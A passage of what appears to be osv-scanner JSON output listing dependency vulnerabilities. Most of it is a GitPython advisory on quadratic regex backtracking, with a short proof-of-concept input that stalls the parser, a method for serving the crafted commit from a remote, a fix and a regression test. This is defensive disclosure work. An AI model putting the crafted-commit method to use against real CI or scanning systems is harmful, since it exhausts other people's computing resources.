              "id": "CVE-2026-115754",
              "name": "CVE-2026-115754",
              "properties": {
                "security-severity": "2.1"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-115754: Serialize JavaScript: Cross-site scripting (XSS) via unescaped \u003c/script at the end of a serialized function body",
                "text": "CVE-2026-115754: Serialize JavaScript: Cross-site scripting (XSS) via unescaped \u003c/script at the end of a serialized function body"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-110856",
                "GHSA-m64x-33q8-m5h7"
              ],
              "fullDescription": {
                "markdown": "### Summary\n\nThis is a residual of GHSA-g5vv-9gxw-82hx / CVE-2026-87819. The 3.1.60 fix made `Actor._from_string` regex-free, but `parse_actor_and_date` still runs `_re_actor_epoch` on the same author/committer/tagger line one step earlier. That pattern backtracks quadratically when the trailing epoch or timezone is missing or malformed, so the same class of slow parse is still reachable in 3.1.62.\n\n### Details\n\n`git/objects/util.py:322`:\n\n```python\n_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n```\n\n`.+?` and `(.*)` can both absorb the same run of spaces, and the required ` (\\d+) ([+-]\\d+)` tail is only checked after them. On a long line with no valid tail, the search retries every split point.\n\nIt is called from `parse_actor_and_date` (`git/objects/util.py:335`), which runs on the author and committer lines in `Commit._deserialize` (`git/objects/commit.py:917`, `:931`) and on the tagger line in `git/objects/tag.py:129`.\n\nThe published payload (letters plus an unterminated `\u003c`) is fast on 3.1.62. Replacing the letters with spaces is not:\n\n| author line (after `author `) | 2 KB | 8 KB | 32 KB |\n|---|---|---|---|\n| `'a'*n + ' \u003c'` (advisory payload) | 0.0 ms | 0.1 ms | 0.4 ms |\n| `' '*n` | 28 ms | 453 ms | 7,700 ms |\n| valid line, long name (control) | 0.0 ms | 0.0 ms | 0.0 ms |\n\nCost grows about 16x for each 4x increase in length.\n\n### PoC\n\n```python\nimport time\nfrom git.objects.util import parse_actor_and_date\n\nline = \"author \" + \" \" * 32000\nt = time.perf_counter()\nparse_actor_and_date(line)\nprint(f\"{time.perf_counter() - t:.1f} s\")   # ~7 s on 3.1.62\n```\n\nEnd to end, reading `Commit.author` on a commit object whose author line is 32 KB of spaces followed by any malformed tail (no epoch, no timezone, non-numeric epoch, or bad timezone) takes about 7.2 s per access. The same line with a valid `1191999972 -0700` tail takes 1.3 ms.\n\nNote for reproducing: `git hash-object -t commit -w` refuses such an object (`missingEmail`), so the test object was written with `--literally`. A remote can still serve one, because `fetch.fsckObjects` and `transfer.fsckObjects` default to false. This is the same delivery model as CVE-2026-87819 (\"craft a commit object with a malformed author field\").\n\n### Impact\n\nCPU exhaustion (CWE-1333) in any application that uses GitPython to read commits or tags from an untrusted repository: CI tooling, repository scanners, code-hosting integrations. Each access to `Commit.author`, `Commit.committer` or `TagObject.tagger` on a crafted object costs seconds, and a repository can contain many such objects.\n\n### Suggested fix\n\nMatch the leading field name with `.[^ ]*` instead of `.+?`. Both stop at the first space after the first character, but `.[^ ]*` cannot overlap the following `(.*)`, so the backtracking disappears:\n\n```python\n_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n```\n\nVerification on current main (73a72c9):\n\n- Differential over 368 actor lines (real-world shapes plus edge cases): 0 differences in match groups for either regex.\n- `' '*n` at 64 KB: 32,170 ms before, 0.98 ms after. Valid lines are unchanged (0.01 ms).\n- The existing test suite gives the same pass/fail set with and without the change\n- The new regression test, `test_parse_actor_and_date_malformed_line_is_linear`, fails on the old pattern (8.4 s) and passes with the fix (0.5 s).\n\nThe full patch (fix plus regression test) is attached below.\n\n```diff\ndiff --git a/git/objects/util.py b/git/objects/util.py\nindex a68d701f..d8c0594d 100644\n--- a/git/objects/util.py\n+++ b/git/objects/util.py\n@@ -319,8 +319,11 @@ def parse_date(string_date: Union[str, datetime]) -\u003e Tuple[int, int]:\n \n \n # Precompiled regexes\n-_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n-_re_only_actor = re.compile(r\"^.+? (.*)$\")\n+# The leading field name (\"author\", \"committer\", \"tagger\") is matched with ``.[^ ]*`` rather than\n+# ``.+?``: both stop at the first space after the first character, but ``.[^ ]*`` cannot overlap the\n+# following ``(.*)``, so a line with no valid trailing epoch/offset no longer backtracks quadratically.\n+_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n+_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n \n \n def parse_actor_and_date(line: str) -\u003e Tuple[Actor, int, int]:\ndiff --git a/test/test_util.py b/test/test_util.py\nindex cf4299d5..e1631420 100644\n--- a/test/test_util.py\n+++ b/test/test_util.py\n@@ -22,6 +22,7 @@ from git.cmd import dashify\n from git.objects.util import (\n     altz_to_utctz_str,\n     from_timestamp,\n+    parse_actor_and_date,\n     parse_date,\n     tzoffset,\n     utctz_to_altz,\n@@ -571,6 +572,30 @@ class TestUtils(TestBase):\n             Actor(\"name last another\", \"some-very-long-email@example.com\"),\n         )\n \n+    def test_parse_actor_and_date_malformed_line_is_linear(self):\n+        # A long author line whose trailing epoch/offset is missing or malformed used to make\n+        # _re_actor_epoch backtrack quadratically: ~7 s per Commit.author access for a 32 KB line.\n+        # The parse result must be unchanged; only the time spent reaching it should move.\n+        for tail in (\"\", \" notanumber -0700\", \" 1191999972\", \" -0700\", \" 1191999972 xx\"):\n+            line = \"author \" + \" \" * 32000 + tail\n+            start = time.perf_counter()\n+            actor, epoch, offset = parse_actor_and_date(line)\n+            self.assertLess(time.perf_counter() - start, 1.0)\n+            self.assertEqual(epoch, 0)\n+            self.assertEqual(offset, 0)\n+\n+        # Well-formed lines, including one with a long name, still parse exactly as before.\n+        actor, epoch, offset = parse_actor_and_date(\n+            \"author Tom Preston-Werner \u003ctom@mojombo.com\u003e 1191999972 -0700\"\n+        )\n+        self.assertEqual(actor, Actor(\"Tom Preston-Werner\", \"tom@mojombo.com\"))\n+        self.assertEqual(epoch, 1191999972)\n+        self.assertEqual(offset, 25200)\n+\n+        actor, epoch, offset = parse_actor_and_date(\"author \" + \"a \" * 16000 + \"\u003ca@b\u003e 1 -0700\")\n+        self.assertEqual(actor.email, \"a@b\")\n+        self.assertEqual(epoch, 1)\n+\n     @ddt.data(\n         (\"name\", \"\"),\n         (\"name\", \"prefix_\"),\n```\n\nFound with AI assistance (Claude) and verified by hand.\n\nBrian Willows",
                "text": "### Summary\n\nThis is a residual of GHSA-g5vv-9gxw-82hx / CVE-2026-87819. The 3.1.60 fix made `Actor._from_string` regex-free, but `parse_actor_and_date` still runs `_re_actor_epoch` on the same author/committer/tagger line one step earlier. That pattern backtracks quadratically when the trailing epoch or timezone is missing or malformed, so the same class of slow parse is still reachable in 3.1.62.\n\n### Details\n\n`git/objects/util.py:322`:\n\n```python\n_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n```\n\n`.+?` and `(.*)` can both absorb the same run of spaces, and the required ` (\\d+) ([+-]\\d+)` tail is only checked after them. On a long line with no valid tail, the search retries every split point.\n\nIt is called from `parse_actor_and_date` (`git/objects/util.py:335`), which runs on the author and committer lines in `Commit._deserialize` (`git/objects/commit.py:917`, `:931`) and on the tagger line in `git/objects/tag.py:129`.\n\nThe published payload (letters plus an unterminated `\u003c`) is fast on 3.1.62. Replacing the letters with spaces is not:\n\n| author line (after `author `) | 2 KB | 8 KB | 32 KB |\n|---|---|---|---|\n| `'a'*n + ' \u003c'` (advisory payload) | 0.0 ms | 0.1 ms | 0.4 ms |\n| `' '*n` | 28 ms | 453 ms | 7,700 ms |\n| valid line, long name (control) | 0.0 ms | 0.0 ms | 0.0 ms |\n\nCost grows about 16x for each 4x increase in length.\n\n### PoC\n\n```python\nimport time\nfrom git.objects.util import parse_actor_and_date\n\nline = \"author \" + \" \" * 32000\nt = time.perf_counter()\nparse_actor_and_date(line)\nprint(f\"{time.perf_counter() - t:.1f} s\")   # ~7 s on 3.1.62\n```\n\nEnd to end, reading `Commit.author` on a commit object whose author line is 32 KB of spaces followed by any malformed tail (no epoch, no timezone, non-numeric epoch, or bad timezone) takes about 7.2 s per access. The same line with a valid `1191999972 -0700` tail takes 1.3 ms.\n\nNote for reproducing: `git hash-object -t commit -w` refuses such an object (`missingEmail`), so the test object was written with `--literally`. A remote can still serve one, because `fetch.fsckObjects` and `transfer.fsckObjects` default to false. This is the same delivery model as CVE-2026-87819 (\"craft a commit object with a malformed author field\").\n\n### Impact\n\nCPU exhaustion (CWE-1333) in any application that uses GitPython to read commits or tags from an untrusted repository: CI tooling, repository scanners, code-hosting integrations. Each access to `Commit.author`, `Commit.committer` or `TagObject.tagger` on a crafted object costs seconds, and a repository can contain many such objects.\n\n### Suggested fix\n\nMatch the leading field name with `.[^ ]*` instead of `.+?`. Both stop at the first space after the first character, but `.[^ ]*` cannot overlap the following `(.*)`, so the backtracking disappears:\n\n```python\n_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n```\n\nVerification on current main (73a72c9):\n\n- Differential over 368 actor lines (real-world shapes plus edge cases): 0 differences in match groups for either regex.\n- `' '*n` at 64 KB: 32,170 ms before, 0.98 ms after. Valid lines are unchanged (0.01 ms).\n- The existing test suite gives the same pass/fail set with and without the change\n- The new regression test, `test_parse_actor_and_date_malformed_line_is_linear`, fails on the old pattern (8.4 s) and passes with the fix (0.5 s).\n\nThe full patch (fix plus regression test) is attached below.\n\n```diff\ndiff --git a/git/objects/util.py b/git/objects/util.py\nindex a68d701f..d8c0594d 100644\n--- a/git/objects/util.py\n+++ b/git/objects/util.py\n@@ -319,8 +319,11 @@ def parse_date(string_date: Union[str, datetime]) -\u003e Tuple[int, int]:\n \n \n # Precompiled regexes\n-_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n-_re_only_actor = re.compile(r\"^.+? (.*)$\")\n+# The leading field name (\"author\", \"committer\", \"tagger\") is matched with ``.[^ ]*`` rather than\n+# ``.+?``: both stop at the first space after the first character, but ``.[^ ]*`` cannot overlap the\n+# following ``(.*)``, so a line with no valid trailing epoch/offset no longer backtracks quadratically.\n+_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n+_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n \n \n def parse_actor_and_date(line: str) -\u003e Tuple[Actor, int, int]:\ndiff --git a/test/test_util.py b/test/test_util.py\nindex cf4299d5..e1631420 100644\n--- a/test/test_util.py\n+++ b/test/test_util.py\n@@ -22,6 +22,7 @@ from git.cmd import dashify\n from git.objects.util import (\n     altz_to_utctz_str,\n     from_timestamp,\n+    parse_actor_and_date,\n     parse_date,\n     tzoffset,\n     utctz_to_altz,\n@@ -571,6 +572,30 @@ class TestUtils(TestBase):\n             Actor(\"name last another\", \"some-very-long-email@example.com\"),\n         )\n \n+    def test_parse_actor_and_date_malformed_line_is_linear(self):\n+        # A long author line whose trailing epoch/offset is missing or malformed used to make\n+        # _re_actor_epoch backtrack quadratically: ~7 s per Commit.author access for a 32 KB line.\n+        # The parse result must be unchanged; only the time spent reaching it should move.\n+        for tail in (\"\", \" notanumber -0700\", \" 1191999972\", \" -0700\", \" 1191999972 xx\"):\n+            line = \"author \" + \" \" * 32000 + tail\n+            start = time.perf_counter()\n+            actor, epoch, offset = parse_actor_and_date(line)\n+            self.assertLess(time.perf_counter() - start, 1.0)\n+            self.assertEqual(epoch, 0)\n+            self.assertEqual(offset, 0)\n+\n+        # Well-formed lines, including one with a long name, still parse exactly as before.\n+        actor, epoch, offset = parse_actor_and_date(\n+            \"author Tom Preston-Werner \u003ctom@mojombo.com\u003e 1191999972 -0700\"\n+        )\n+        self.assertEqual(actor, Actor(\"Tom Preston-Werner\", \"tom@mojombo.com\"))\n+        self.assertEqual(epoch, 1191999972)\n+        self.assertEqual(offset, 25200)\n+\n+        actor, epoch, offset = parse_actor_and_date(\"author \" + \"a \" * 16000 + \"\u003ca@b\u003e 1 -0700\")\n+        self.assertEqual(actor.email, \"a@b\")\n+        self.assertEqual(epoch, 1)\n+\n     @ddt.data(\n         (\"name\", \"\"),\n         (\"name\", \"prefix_\"),\n```\n\nFound with AI assistance (Claude) and verified by hand.\n\nBrian Willows"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-110856](https://osv.dev/CVE-2026-110856)**.\n\n## [GHSA-m64x-33q8-m5h7](https://osv.dev/GHSA-m64x-33q8-m5h7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e This is a residual of GHSA-g5vv-9gxw-82hx / CVE-2026-87819. The 3.1.60 fix made `Actor._from_string` regex-free, but `parse_actor_and_date` still runs `_re_actor_epoch` on the same author/committer/tagger line one step earlier. That pattern backtracks quadratically when the trailing epoch or timezone is missing or malformed, so the same class of slow parse is still reachable in 3.1.62.\n\u003e \n\u003e ### Details\n\u003e \n\u003e `git/objects/util.py:322`:\n\u003e \n\u003e ```python\n\u003e _re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e ```\n\u003e \n\u003e `.+?` and `(.*)` can both absorb the same run of spaces, and the required ` (\\d+) ([+-]\\d+)` tail is only checked after them. On a long line with no valid tail, the search retries every split point.\n\u003e \n\u003e It is called from `parse_actor_and_date` (`git/objects/util.py:335`), which runs on the author and committer lines in `Commit._deserialize` (`git/objects/commit.py:917`, `:931`) and on the tagger line in `git/objects/tag.py:129`.\n\u003e \n\u003e The published payload (letters plus an unterminated `\u003c`) is fast on 3.1.62. Replacing the letters with spaces is not:\n\u003e \n\u003e | author line (after `author `) | 2 KB | 8 KB | 32 KB |\n\u003e |---|---|---|---|\n\u003e | `'a'*n + ' \u003c'` (advisory payload) | 0.0 ms | 0.1 ms | 0.4 ms |\n\u003e | `' '*n` | 28 ms | 453 ms | 7,700 ms |\n\u003e | valid line, long name (control) | 0.0 ms | 0.0 ms | 0.0 ms |\n\u003e \n\u003e Cost grows about 16x for each 4x increase in length.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e ```python\n\u003e import time\n\u003e from git.objects.util import parse_actor_and_date\n\u003e \n\u003e line = \"author \" + \" \" * 32000\n\u003e t = time.perf_counter()\n\u003e parse_actor_and_date(line)\n\u003e print(f\"{time.perf_counter() - t:.1f} s\")   # ~7 s on 3.1.62\n\u003e ```\n\u003e \n\u003e End to end, reading `Commit.author` on a commit object whose author line is 32 KB of spaces followed by any malformed tail (no epoch, no timezone, non-numeric epoch, or bad timezone) takes about 7.2 s per access. The same line with a valid `1191999972 -0700` tail takes 1.3 ms.\n\u003e \n\u003e Note for reproducing: `git hash-object -t commit -w` refuses such an object (`missingEmail`), so the test object was written with `--literally`. A remote can still serve one, because `fetch.fsckObjects` and `transfer.fsckObjects` default to false. This is the same delivery model as CVE-2026-87819 (\"craft a commit object with a malformed author field\").\n\u003e \n\u003e ### Impact\n\u003e \n\u003e CPU exhaustion (CWE-1333) in any application that uses GitPython to read commits or tags from an untrusted repository: CI tooling, repository scanners, code-hosting integrations. Each access to `Commit.author`, `Commit.committer` or `TagObject.tagger` on a crafted object costs seconds, and a repository can contain many such objects.\n\u003e \n\u003e ### Suggested fix\n\u003e \n\u003e Match the leading field name with `.[^ ]*` instead of `.+?`. Both stop at the first space after the first character, but `.[^ ]*` cannot overlap the following `(.*)`, so the backtracking disappears:\n\u003e \n\u003e ```python\n\u003e _re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e _re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n\u003e ```\n\u003e \n\u003e Verification on current main (73a72c9):\n\u003e \n\u003e - Differential over 368 actor lines (real-world shapes plus edge cases): 0 differences in match groups for either regex.\n\u003e - `' '*n` at 64 KB: 32,170 ms before, 0.98 ms after. Valid lines are unchanged (0.01 ms).\n\u003e - The existing test suite gives the same pass/fail set with and without the change\n\u003e - The new regression test, `test_parse_actor_and_date_malformed_line_is_linear`, fails on the old pattern (8.4 s) and passes with the fix (0.5 s).\n\u003e \n\u003e The full patch (fix plus regression test) is attached below.\n\u003e \n\u003e ```diff\n\u003e diff --git a/git/objects/util.py b/git/objects/util.py\n\u003e index a68d701f..d8c0594d 100644\n\u003e --- a/git/objects/util.py\n\u003e +++ b/git/objects/util.py\n\u003e @@ -319,8 +319,11 @@ def parse_date(string_date: Union[str, datetime]) -\u003e Tuple[int, int]:\n\u003e  \n\u003e  \n\u003e  # Precompiled regexes\n\u003e -_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e -_re_only_actor = re.compile(r\"^.+? (.*)$\")\n\u003e +# The leading field name (\"author\", \"committer\", \"tagger\") is matched with ``.[^ ]*`` rather than\n\u003e +# ``.+?``: both stop at the first space after the first character, but ``.[^ ]*`` cannot overlap the\n\u003e +# following ``(.*)``, so a line with no valid trailing epoch/offset no longer backtracks quadratically.\n\u003e +_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e +_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n\u003e  \n\u003e  \n\u003e  def parse_actor_and_date(line: str) -\u003e Tuple[Actor, int, int]:\n\u003e diff --git a/test/test_util.py b/test/test_util.py\n\u003e index cf4299d5..e1631420 100644\n\u003e --- a/test/test_util.py\n\u003e +++ b/test/test_util.py\n\u003e @@ -22,6 +22,7 @@ from git.cmd import dashify\n\u003e  from git.objects.util import (\n\u003e      altz_to_utctz_str,\n\u003e      from_timestamp,\n\u003e +    parse_actor_and_date,\n\u003e      parse_date,\n\u003e      tzoffset,\n\u003e      utctz_to_altz,\n\u003e @@ -571,6 +572,30 @@ class TestUtils(TestBase):\n\u003e              Actor(\"name last another\", \"some-very-long-email@example.com\"),\n\u003e          )\n\u003e  \n\u003e +    def test_parse_actor_and_date_malformed_line_is_linear(self):\n\u003e +        # A long author line whose trailing epoch/offset is missing or malformed used to make\n\u003e +        # _re_actor_epoch backtrack quadratically: ~7 s per Commit.author access for a 32 KB line.\n\u003e +        # The parse result must be unchanged; only the time spent reaching it should move.\n\u003e +        for tail in (\"\", \" notanumber -0700\", \" 1191999972\", \" -0700\", \" 1191999972 xx\"):\n\u003e +            line = \"author \" + \" \" * 32000 + tail\n\u003e +            start = time.perf_counter()\n\u003e +            actor, epoch, offset = parse_actor_and_date(line)\n\u003e +            self.assertLess(time.perf_counter() - start, 1.0)\n\u003e +            self.assertEqual(epoch, 0)\n\u003e +            self.assertEqual(offset, 0)\n\u003e +\n\u003e +        # Well-formed lines, including one with a long name, still parse exactly as before.\n\u003e +        actor, epoch, offset = parse_actor_and_date(\n\u003e +            \"author Tom Preston-Werner \u003ctom@mojombo.com\u003e 1191999972 -0700\"\n\u003e +        )\n\u003e +        self.assertEqual(actor, Actor(\"Tom Preston-Werner\", \"tom@mojombo.com\"))\n\u003e +        self.assertEqual(epoch, 1191999972)\n\u003e +        self.assertEqual(offset, 25200)\n\u003e +\n\u003e +        actor, epoch, offset = parse_actor_and_date(\"author \" + \"a \" * 16000 + \"\u003ca@b\u003e 1 -0700\")\n\u003e +        self.assertEqual(actor.email, \"a@b\")\n\u003e +        self.assertEqual(epoch, 1)\n\u003e +\n\u003e      @ddt.data(\n\u003e          (\"name\", \"\"),\n\u003e          (\"name\", \"prefix_\"),\n\u003e ```\n\u003e \n\u003e Found with AI assistance (Claude) and verified by hand.\n\u003e \n\u003e Brian Willows\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | gitpython | 3.1.59 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-m64x-33q8-m5h7 | gitpython | 3.2.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-110856\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-110856](https://osv.dev/CVE-2026-110856)**.\n\n## [GHSA-m64x-33q8-m5h7](https://osv.dev/GHSA-m64x-33q8-m5h7)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e This is a residual of GHSA-g5vv-9gxw-82hx / CVE-2026-87819. The 3.1.60 fix made `Actor._from_string` regex-free, but `parse_actor_and_date` still runs `_re_actor_epoch` on the same author/committer/tagger line one step earlier. That pattern backtracks quadratically when the trailing epoch or timezone is missing or malformed, so the same class of slow parse is still reachable in 3.1.62.\n\u003e \n\u003e ### Details\n\u003e \n\u003e `git/objects/util.py:322`:\n\u003e \n\u003e ```python\n\u003e _re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e ```\n\u003e \n\u003e `.+?` and `(.*)` can both absorb the same run of spaces, and the required ` (\\d+) ([+-]\\d+)` tail is only checked after them. On a long line with no valid tail, the search retries every split point.\n\u003e \n\u003e It is called from `parse_actor_and_date` (`git/objects/util.py:335`), which runs on the author and committer lines in `Commit._deserialize` (`git/objects/commit.py:917`, `:931`) and on the tagger line in `git/objects/tag.py:129`.\n\u003e \n\u003e The published payload (letters plus an unterminated `\u003c`) is fast on 3.1.62. Replacing the letters with spaces is not:\n\u003e \n\u003e | author line (after `author `) | 2 KB | 8 KB | 32 KB |\n\u003e |---|---|---|---|\n\u003e | `'a'*n + ' \u003c'` (advisory payload) | 0.0 ms | 0.1 ms | 0.4 ms |\n\u003e | `' '*n` | 28 ms | 453 ms | 7,700 ms |\n\u003e | valid line, long name (control) | 0.0 ms | 0.0 ms | 0.0 ms |\n\u003e \n\u003e Cost grows about 16x for each 4x increase in length.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e ```python\n\u003e import time\n\u003e from git.objects.util import parse_actor_and_date\n\u003e \n\u003e line = \"author \" + \" \" * 32000\n\u003e t = time.perf_counter()\n\u003e parse_actor_and_date(line)\n\u003e print(f\"{time.perf_counter() - t:.1f} s\")   # ~7 s on 3.1.62\n\u003e ```\n\u003e \n\u003e End to end, reading `Commit.author` on a commit object whose author line is 32 KB of spaces followed by any malformed tail (no epoch, no timezone, non-numeric epoch, or bad timezone) takes about 7.2 s per access. The same line with a valid `1191999972 -0700` tail takes 1.3 ms.\n\u003e \n\u003e Note for reproducing: `git hash-object -t commit -w` refuses such an object (`missingEmail`), so the test object was written with `--literally`. A remote can still serve one, because `fetch.fsckObjects` and `transfer.fsckObjects` default to false. This is the same delivery model as CVE-2026-87819 (\"craft a commit object with a malformed author field\").\n\u003e \n\u003e ### Impact\n\u003e \n\u003e CPU exhaustion (CWE-1333) in any application that uses GitPython to read commits or tags from an untrusted repository: CI tooling, repository scanners, code-hosting integrations. Each access to `Commit.author`, `Commit.committer` or `TagObject.tagger` on a crafted object costs seconds, and a repository can contain many such objects.\n\u003e \n\u003e ### Suggested fix\n\u003e \n\u003e Match the leading field name with `.[^ ]*` instead of `.+?`. Both stop at the first space after the first character, but `.[^ ]*` cannot overlap the following `(.*)`, so the backtracking disappears:\n\u003e \n\u003e ```python\n\u003e _re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e _re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n\u003e ```\n\u003e \n\u003e Verification on current main (73a72c9):\n\u003e \n\u003e - Differential over 368 actor lines (real-world shapes plus edge cases): 0 differences in match groups for either regex.\n\u003e - `' '*n` at 64 KB: 32,170 ms before, 0.98 ms after. Valid lines are unchanged (0.01 ms).\n\u003e - The existing test suite gives the same pass/fail set with and without the change\n\u003e - The new regression test, `test_parse_actor_and_date_malformed_line_is_linear`, fails on the old pattern (8.4 s) and passes with the fix (0.5 s).\n\u003e \n\u003e The full patch (fix plus regression test) is attached below.\n\u003e \n\u003e ```diff\n\u003e diff --git a/git/objects/util.py b/git/objects/util.py\n\u003e index a68d701f..d8c0594d 100644\n\u003e --- a/git/objects/util.py\n\u003e +++ b/git/objects/util.py\n\u003e @@ -319,8 +319,11 @@ def parse_date(string_date: Union[str, datetime]) -\u003e Tuple[int, int]:\n\u003e  \n\u003e  \n\u003e  # Precompiled regexes\n\u003e -_re_actor_epoch = re.compile(r\"^.+? (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e -_re_only_actor = re.compile(r\"^.+? (.*)$\")\n\u003e +# The leading field name (\"author\", \"committer\", \"tagger\") is matched with ``.[^ ]*`` rather than\n\u003e +# ``.+?``: both stop at the first space after the first character, but ``.[^ ]*`` cannot overlap the\n\u003e +# following ``(.*)``, so a line with no valid trailing epoch/offset no longer backtracks quadratically.\n\u003e +_re_actor_epoch = re.compile(r\"^.[^ ]* (.*) (\\d+) ([+-]\\d+).*$\")\n\u003e +_re_only_actor = re.compile(r\"^.[^ ]* (.*)$\")\n\u003e  \n\u003e  \n\u003e  def parse_actor_and_date(line: str) -\u003e Tuple[Actor, int, int]:\n\u003e diff --git a/test/test_util.py b/test/test_util.py\n\u003e index cf4299d5..e1631420 100644\n\u003e --- a/test/test_util.py\n\u003e +++ b/test/test_util.py\n\u003e @@ -22,6 +22,7 @@ from git.cmd import dashify\n\u003e  from git.objects.util import (\n\u003e      altz_to_utctz_str,\n\u003e      from_timestamp,\n\u003e +    parse_actor_and_date,\n\u003e      parse_date,\n\u003e      tzoffset,\n\u003e      utctz_to_altz,\n\u003e @@ -571,6 +572,30 @@ class TestUtils(TestBase):\n\u003e              Actor(\"name last another\", \"some-very-long-email@example.com\"),\n\u003e          )\n\u003e  \n\u003e +    def test_parse_actor_and_date_malformed_line_is_linear(self):\n\u003e +        # A long author line whose trailing epoch/offset is missing or malformed used to make\n\u003e +        # _re_actor_epoch backtrack quadratically: ~7 s per Commit.author access for a 32 KB line.\n\u003e +        # The parse result must be unchanged; only the time spent reaching it should move.\n\u003e +        for tail in (\"\", \" notanumber -0700\", \" 1191999972\", \" -0700\", \" 1191999972 xx\"):\n\u003e +            line = \"author \" + \" \" * 32000 + tail\n\u003e +            start = time.perf_counter()\n\u003e +            actor, epoch, offset = parse_actor_and_date(line)\n\u003e +            self.assertLess(time.perf_counter() - start, 1.0)\n\u003e +            self.assertEqual(epoch, 0)\n\u003e +            self.assertEqual(offset, 0)\n\u003e +\n\u003e +        # Well-formed lines, including one with a long name, still parse exactly as before.\n\u003e +        actor, epoch, offset = parse_actor_and_date(\n\u003e +            \"author Tom Preston-Werner \u003ctom@mojombo.com\u003e 1191999972 -0700\"\n\u003e +        )\n\u003e +        self.assertEqual(actor, Actor(\"Tom Preston-Werner\", \"tom@mojombo.com\"))\n\u003e +        self.assertEqual(epoch, 1191999972)\n\u003e +        self.assertEqual(offset, 25200)\n\u003e +\n\u003e +        actor, epoch, offset = parse_actor_and_date(\"author \" + \"a \" * 16000 + \"\u003ca@b\u003e 1 -0700\")\n\u003e +        self.assertEqual(actor.email, \"a@b\")\n\u003e +        self.assertEqual(epoch, 1)\n\u003e +\n\u003e      @ddt.data(\n\u003e          (\"name\", \"\"),\n\u003e          (\"name\", \"prefix_\"),\n\u003e ```\n\u003e \n\u003e Found with AI assistance (Claude) and verified by hand.\n\u003e \n\u003e Brian Willows\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | gitpython | 3.1.59 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-m64x-33q8-m5h7 | gitpython | 3.2.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-110856\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-110856",
              "name": "CVE-2026-110856",
              "properties": {
                "security-severity": "8.7"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-110856: GitPython parse_actor_and_date() is vulnerable to quadratic backtracking on malformed identity lines",
                "text": "CVE-2026-110856: GitPython parse_actor_and_date() is vulnerable to quadratic backtracking on malformed identity lines"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-101905",
                "GHSA-m8m8-qj5v-23w3"
              ],
              "fullDescription": {
